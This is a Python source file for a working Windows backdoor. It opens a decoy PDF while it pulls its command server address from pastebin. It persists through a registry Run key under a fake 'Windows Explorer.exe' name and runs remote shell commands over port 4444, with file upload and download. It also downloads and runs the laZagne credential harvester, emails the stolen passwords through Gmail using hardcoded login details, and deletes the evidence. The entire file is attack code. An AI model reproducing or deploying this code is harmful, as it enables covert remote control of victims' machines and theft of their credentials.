import socket
import subprocess
import json
import os
import base64
import sys
import shutil
import requests
import tempfile
import smtplib
import platform

OS_NAME = platform.system().lower() # Gets 'windows', 'Linux', 'Darwin'

def fetch_c2_ip():
    try:
        url = "https://pastebin.com/raw/DjTikqsH" 
        response = requests.get(url, timeout=5) # Sends GET request to URL
        return response.text.strip() # Returns content of URL as string
    except:
        return "Server down for pastebin" # If URL not reachable

class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent() 
        # These 2 lines make a TCP socket connection with IPv4
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port)) 
        self.deploy_payload()
        self.log_file = os.path.join(tempfile.gettempdir(), "activity_log.txt")
    def log_to_file(self, command, result):
        try:
            with open(self.log_file, "a", encoding="utf-8") as file:
                file.write(f"[COMMAND] {command}\n[RESULT]\n{result}\n\n")
        except Exception as e:
            pass

    def send_logs_before_exit(self):
        try:
            with open(self.log_file, "rb") as file:
                encoded_logs = base64.b64encode(file.read()).decode()
                self.reliable_send(["logfile", encoded_logs])
            os.remove(self.log_file)
        except Exception:
            pass


    def deploy_payload(self):
        try:
            temp_directory = tempfile.gettempdir()
            os.chdir(temp_directory)

            lazagne_url = f"http://{self.ATTACKER_IP}/Sus_files/laZagne.exe"
            lazagne_path = os.path.join(temp_directory, "laZagne.exe")

            # Download
            response = requests.get(lazagne_url)
            with open(lazagne_path, "wb") as file:
                file.write(response.content)

            # Execute lazagne
            output = subprocess.check_output([lazagne_path, "all"], shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

            # Send via email
            self.send_mail("sulaimaneksambi@gmail.com", "Ywmzzdxotxypxpmze", output.decode())

            # Delete evidence
            os.remove(lazagne_path)

        except Exception as e:
            self.reliable_send(f"[-] Error in deploy_payload: {e}")

    def send_mail(self, email, password, message):
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()
        except Exception as e:
            self.reliable_send(f"[-] Email sending failed: {e}")

    def become_persistent(self):
	    # File location set :
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe" 
        # If file dosen't exist :
        if not os.path.exists(evil_file_location): 
	        # Copies file in location specified
            shutil.copyfile(sys.executable, evil_file_location) 
            # Makes it run on startup
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True) 

    def reliable_send(self, data):
        json_data = json.dumps(data).encode()
        length = len(json_data).to_bytes(4, byteorder='big')
        self.connection.send(length + json_data)

    def reliable_receive(self):
         # First, receive the 4-byte length header
        raw_length = self._recvall(4)
        if raw_length is None:
            return None  # Connection closed or error
        message_length = int.from_bytes(raw_length, byteorder='big')

        # Now receive the actual message of known length
        json_data = self._recvall(message_length)
        return json.loads(json_data.decode())

    def _recvall(self, length):
        """Helper to receive exactly 'length' bytes."""
        data = b""
        while len(data) < length:
            try:
                packet = self.connection.recv(length - len(data))
                if not packet:
                    return None  # Connection closed
                data += packet
            except socket.error:
                return None  # Socket error
        return data

    def execute_command(self, command):
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL).decode("utf-8", errors="ignore") # Execute the command and return the result
        except subprocess.CalledProcessError as e:
            return "[-] Invalid Command"
    
    def change_working_directory_to(self, path):
        if os.path.isdir(path):  # Check if it's a valid directory
            try:
                os.chdir(path)  # Change the working directory
                return "[+] Changed working directory to " + path
            except PermissionError:
                return "[-] Error: Permission denied to access the directory: " + path
            except OSError as e:
                return f"[-] Error: Failed to change directory: {e}"
        else:
            return "[-] Error: Path does not exist or is not a directory: " + path

    def read_file(self, path):
        if not os.path.exists(path):  # Check if the file exists
            return f"[-] Error: File at {path} does not exist."
        
        try:
            with open(path, "rb") as file:  # Open the file in binary mode
                return base64.b64encode(file.read()).decode()  # Read, encode, and return base64 string
        except Exception as e:
            return f"[-] Error reading file: {str(e)}"  # Return error if any exception occurs

    def write_file(self, path, content):
        try:
            # Decode the base64 content and handle invalid base64 data
            decoded_content = base64.b64decode(content)
            
            # Check if the content is empty after decoding (this can happen if the base64 content is corrupted)
            if not decoded_content:
                return "[-] Error: Decoded content is empty. Invalid base64 data."
            
            # Check if the directory exists, if not, return an error
            directory = os.path.dirname(path)
            if not os.path.exists(directory):
                return f"[-] Error: Directory does not exist: {directory}"

            # Write the decoded content to the file
            with open(path, "wb") as file:
                file.write(decoded_content)
            
            return "[+] Upload successful"
        
        except base64.binascii.Error:
            return "[-] Error: Invalid base64 encoding."
        except PermissionError:
            return f"[-] Error: Permission denied to write to {path}."
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def run(self):
        while True:
            command = self.reliable_receive() # Receive the command from the attacker machine
            try:
                if command[0] == "exit":
                    self.send_logs_before_exit()
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_command(command)
                
                if command[0] != "upload":
                    self.log_to_file(command, command_result)
            except Exception:
                self.send_logs_before_exit()
                command_result = "[-] Error during command execution"
                
            self.reliable_send(command_result) # Send the result back to the attacker machine

ATTACKER_IP = fetch_c2_ip()
file_name = os.path.join(sys._MEIPASS, "sample.pdf") # Location for pdf
subprocess.Popen(file_name, shell=True) # Open the pdf file

try:
    my_backdoor = Backdoor(ATTACKER_IP, 4444) # Create an object of the class
    my_backdoor.run() # Call the run method
except Exception:
    try:
        my_backdoor.send_logs_before_exit()
    except:
        pass
    sys.exit()